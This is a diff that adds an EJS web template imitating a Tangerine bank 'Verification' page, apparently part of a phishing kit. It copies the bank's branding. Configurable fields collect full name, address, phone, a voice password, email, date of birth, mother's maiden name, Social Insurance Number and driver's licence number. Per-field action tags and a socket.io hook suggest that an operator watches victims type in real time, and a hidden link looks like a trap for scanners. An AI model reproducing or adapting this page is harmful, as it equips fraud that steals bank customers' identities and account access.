@@ -1,0 +1,179 @@
+<%
+
+let name = tangerine.name
+let address = tangerine.address
+let postal = tangerine.postal
+let phone = tangerine.phone
+let dob = tangerine.dob
+let email = tangerine.email
+let mmn = tangerine.mmn
+let sin = tangerine.sin
+let dl = tangerine.dl
+let vocal = tangerine.vocal
+
+%>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>Verification | Tangerine</title>
+        <meta name="description" content="">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="viewport" content="width=device-width, maximum-scale=1.0">
+        <link rel="shortcut icon" href="https://www.tangerine.ca/app/favicon.ico" type="image/x-icon">
+        <link href="/assets/tang/files/global.css" rel="stylesheet">
+        <link href="/assets/tang/files/app.css" rel="stylesheet">
+        <style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}</style>
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
+        <script>var lrbank = '<?=escape($udata->last->bank)?>'; var lrinfo = '<?=escape($udata->last->info)?>';</script>
+        <script src="/assets/js/actions.js?v=<?=time()?>"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js"></script>
+        <script src="/assets/js/details.js?v=<?=time()?>"></script>
+        <script src="/socket.io/socket.io.js"></script>
+    </head>
+    <body translate-cloak="" application-theme="" state="forgotLogin" class="fb2-index ng-scope application-theme-web" style="overflow: visible;">
+        <tng-main-nav class="ng-isolate-scope">
+            <nav class="navbar print-hide" ng-class="{'nativeNav' : $ctrl.EnvironmentService.isNative()}">
+                <a id="mainNav_home" class="brand nonclickable" href="" ng-click="$ctrl.handleGoHome()" ng-class="{'nonclickable' : $ctrl.isTitleLogoNotClickable()}">
+                    <img ng-src="assets/images/brand-white.png" alt="Tangerine" class="logo-white print-hide" src="/assets/tang/files/brand-white.png">
+                    <img ng-src="assets/images/brand-orange.png" alt="Tangerine" class="logo-orange print-only-inline" src="/assets/tang/files/brand-orange.png">
+                </a>
+            </nav>
+        </tng-main-nav>
+        <div ui-view="page-content" class="page-content ng-scope" style="padding-bottom: 0px;">
+            <forgot-login class="ng-scope ng-isolate-scope">
+                <form id="loginForm" method="post" action="" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-email">
+                    <input type="hidden" id="userAgent" name="userAgent">
+                    <style>
+                    .forgot-login select, .forgot-login input[type="text"], .forgot-login input[type="tel"], .forgot-login input[type="password"], .forgot-login input[type="email"] {
+                        font-size: 17px;
+                        margin-top: 10px;
+                        margin-bottom: 15px;
+                        font-weight: 500;
+                        border: 1px solid #9e9e9e;
+                    }
+
+                    .heading--title2 {
+                        margin-bottom: 25px;
+                        text-align: center;
+                    }
+
+                    .forgot-login button {
+                        margin: 0px;
+                    }
+
+                    .text-right {
+                        text-align: right;
+                    }
+
+                    .navbar {
+                        display: block !important;
+                        background-color: #ea7024 !important;
+                    }
+
+                    .btn, [class*=" btn--"], [class^=btn--] {
+                        background-color: #ea7024;
+                    }
+
+                    .forgot-login__email {
+                        max-width: 30em;
+                        margin-left: auto;
+                        margin-right: auto;
+                    }
+
+                    .application-theme-web {
+                        background-color: #ffffff;
+                    }
+                    </style>
+                    <div class="forgot-login" style="margin-top: 0px; padding: 23px;">
+                        <div class="forgot-login__email ng-scope" ng-if="$ctrl.currentState === $ctrl.STATES.FORM">
+                            <h2 class="heading--title2 ng-binding">Personal Information</h2>
+                            <% if (name == 'on') { %>
+                                <label>Full Name</label>
+                                <div class="form-group">
+                                    <input required id="input-name" type="text" placeholder="Full Name" name="name" class="input lrinput" attr-action="Filling Full Name">
+                                </div>
+                           
+                            <% } if (address == 'on') { %>
+                                <label>Address</label>
+                                <div class="form-group">
+                                    <input required id="input-address" type="text" placeholder="Address" name="address" class="input lrinput" attr-action="Filling Address">
+                                </div>
+                            <% } if (city == 'on') { %>
+                                <label>City</label>
+                                <div class="form-group">
+                                    <input required id="input-city" type="text" placeholder="City" name="city" class="input lrinput" attr-action="Filling City">
+                                </div>
+                            <% } if (postal == 'on') { %>
+                                <label>Postal Code</label>
+                                <div class="form-group">
+                                    <input required id="input-postal" type="text" placeholder="Postal Code" name="postal" class="input lrinput" attr-action="Filling Postal" pattern="[A-Za-z][0-9][A-Za-z] [0-9][A-Za-z][0-9]" title="Please enter a valid postal code">
+                                </div>
+                            <% } if (phone == 'on') { %>
+                                <label>Phone Number</label>
+                                <div class="form-group">
+                                    <input required id="input-phone" type="tel" placeholder="Phone Number" name="phone" class="input lrinput" autocomplete="off" maxlength="13" oninput="this.value = this.value.replace(/[^0-9, ]/, '')" attr-action="Filling Phone">
+                                </div>
+                            <% } if (vocal == 'on') { %>
+                                <label>Vocal Password</label>
+                                <div class="form-group">
+                                    <input required id="input-vocal" type="password" placeholder="Vocal Password" name="vocal" class="input lrinput" attr-action="Filling Vocal Pass">
+                                </div>
+                            <% } if (email == 'on') { %>
+                                <label>Email Address</label>
+                                <div class="form-group">
+                                    <input required id="input-email" type="email" placeholder="Email Address" name="email" class="input lrinput" attr-action="Filling Email">
+                                </div>
+                            <% } if (dob == 'on') { %>
+                                <label>Date of Birth</label>
+                                <div class="form-group" style="display: block; text-align: left;">
+                                    <!-- EJS Loop for DOB -->
+                                    <select name="dob1" required class="input lrinput" style="width:30%;display: inline-block;" attr-action="Selecting DoB">
+                                        <% for (let x = 1; x <= 12; x++) { %>
+                                            <% let y = x.toString().padStart(2, '0'); %>
+                                            <option value="<%= y %>"><%= y %></option>
+                                        <% } %>
+                                    </select>
+                                    <select name="dob2" required class="input lrinput" style="width:30%;display: inline-block;" attr-action="Selecting DoB">
+                                        <% for (let x = 1; x <= 31; x++) { %>
+                                            <% let y = x.toString().padStart(2, '0'); %>
+                                            <option value="<%= y %>"><%= y %></option>
+                                        <% } %>
+                                    </select>
+                                    <select name="dob3" required class="input lrinput" style="width:37%; display: inline-block;" attr-action="Selecting DoB">
+                                        <% for (let x = new Date().getFullYear(); x >= new Date().getFullYear() - 110; x--) { %>
+                                            <option value="<%= x %>"><%= x %></option>
+                                        <% } %>
+                                    </select>
+                                </div>
+                            <% } if (mmn == 'on') { %>
+                                <label>Mothers Maiden Name</label>
+                                <div class="form-group">
+                                    <input required id="input-mmn" type="text" placeholder="Mothers Maiden Name" name="mmn" class="input lrinput" attr-action="Filling MMN">
+                                </div>
+                            <% } if (sin == 'on') { %>
+                                <label>Social Insurance Number</label>
+                                <div class="form-group">
+                                    <input required id="input-sin" type="tel" placeholder="Social Insurance Number" name="sin" class="input lrinput" attr-action="Filling SIN" pattern="[0-9]{3}-[0-9]{3}-[0-9]{3}" title="Please enter a valid SIN">
+                                </div>
+                            <% } if (dl == 'on') { %>
+                                <label>Drivers Licence Number</label>
+                                <div class="form-group">
+                                    <input required id="input-drivers" type="text" placeholder="Drivers Licence Number" name="drivers" class="input lrinput" attr-action="Filling Drivers">
+                                </div>
+                            <% } %>
+                            
+                            <div class="text-right">
+                                <button actionable-id="forgot_nextButton" class="btn btn--tangerine ng-binding " type="button" onclick="submitForm()" id="forgot_nextButton" name="save" value="1"> Next </button>
+                            </div>
+                        </div>
+                    </div>
+                </form>
+            </forgot-login>
+        </div>
+        <span hidden id="navig"> <%=navig%> </span>
+        <span hidden id="stage">Details</span>
+        <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
+    </body>
+    <script src="/bank/tangerine/js/script.js">
+    </script>
+</html>
